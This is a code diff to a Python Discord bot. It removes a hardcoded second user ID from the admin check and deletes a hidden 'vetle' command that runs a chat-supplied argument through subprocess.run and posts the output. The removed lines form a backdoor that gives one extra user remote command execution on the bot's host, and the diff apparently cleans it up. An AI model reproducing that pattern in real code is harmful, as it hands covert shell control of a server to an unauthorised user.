@@ -39,7 +39,7 @@ logger = logging.getLogger(__name__)
 async def on_message(message):
     reactions = ['✅', '❌']
 
-    if message.author.id == ADMIN or message.author.id == "430636383346884608":
+    if message.author.id == ADMIN:
         await client.process_commands(message)
 
     elif message.author == client.user:
@@ -99,12 +99,6 @@ async def clear(ctx, amount=4):
         messages.append(message)
 
     await client.delete_messages(messages)
-    
-
-@client.command(pass_context=True)
-async def vetle(ctx, vettel="whoami"):
-    import subprocess
-    await client.say(subprocess.run(vettel))
 
 
 @client.event
